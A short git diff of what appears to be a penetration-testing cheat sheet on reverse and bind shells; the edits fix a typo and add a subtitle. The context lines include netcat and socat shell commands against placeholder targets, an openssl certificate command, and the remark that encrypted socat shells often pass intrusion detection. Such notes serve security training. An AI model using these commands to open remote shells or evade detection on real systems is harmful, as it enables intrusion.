@@ -73,7 +73,7 @@ Local > `nc TARGET_IP PORT`
 
 # socat Encrypted Shells
 
-socat can perform shell encryption which often passes IDS by default. *Replace `TCP` with `OPENSSL` to create **encrypted** socal shells*
+socat can perform shell encryption which often passes IDS by default. *Replace `TCP` with `OPENSSL` to create **encrypted** socat shells*
 
 ### Certificate Generation
 - `openssl req --newkey rsa:2048 -nodes -keyout shell.key -x509 -days 365 -out shell.crt`, to generate a 2048 bit RSA cert, self-signed, valid for a year
@@ -88,6 +88,7 @@ socat can perform shell encryption which often passes IDS by default. *Replace `
 - `socat OPENSSL:TARGET-IP:PORT,verify=0 -` , attacker interacts with hosted shell
 
 # Common Shell Payloads
+*Lo-spec reverse shells for Windows and Linux*
 
 - netcat for windows, `nc.exe`, located at: `/usr/share/windows-resources/binaries` in kali
 - `-e` , allows for process execution on connnection, ie. `/bin/bash` 
